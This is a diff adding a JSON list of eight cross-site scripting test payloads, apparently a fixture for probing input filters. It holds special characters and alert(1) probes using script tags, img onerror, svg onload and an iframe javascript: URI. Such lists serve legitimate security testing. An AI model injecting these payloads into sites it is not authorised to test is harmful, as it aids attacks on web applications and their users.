@@ -1,0 +1,42 @@
+[
+  {
+    "payload": "<",
+    "category": "basic",
+    "description": "Less-than sign"
+  },
+  {
+    "payload": ">",
+    "category": "basic",
+    "description": "Greater-than sign"
+  },
+  {
+    "payload": "'",
+    "category": "basic",
+    "description": "Single quote"
+  },
+  {
+    "payload": "\"",
+    "category": "basic",
+    "description": "Double quote"
+  },
+  {
+    "payload": "<script>alert(1)</script>",
+    "category": "script",
+    "description": "Inline script tag"
+  },
+  {
+    "payload": "<img src=x onerror=alert(1)>",
+    "category": "img",
+    "description": "Image onerror event"
+  },
+  {
+    "payload": "\"><svg onload=alert(1)>",
+    "category": "svg",
+    "description": "SVG onload vector"
+  },
+  {
+    "payload": "<iframe src=javascript:alert(1)>",
+    "category": "iframe",
+    "description": "Iframe JS URI"
+  }
+]
